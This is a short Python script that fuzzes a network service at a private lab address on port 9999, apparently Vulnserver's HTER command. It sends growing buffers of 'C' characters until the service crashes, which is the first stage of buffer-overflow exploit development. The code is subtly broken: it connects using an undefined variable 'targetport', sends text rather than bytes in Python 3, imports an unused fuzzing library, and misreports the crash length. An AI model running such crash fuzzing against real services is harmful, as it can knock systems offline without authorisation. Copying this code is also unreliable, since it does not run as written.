#!/usr/bin/python3
import socket
import sys
from time import sleep
from boofuzz import *

host = '192.168.145.128'  # Target IP
port = 9999  # Target Port
proto = 'tcp'

string = "HTER "
buffer = "C" * 100
payload = string + buffer


while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, targetport))
        s.send(payload)
        s.close()
        sleep(1)
        payload = payload + buffer
    except:
        print(payload)
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
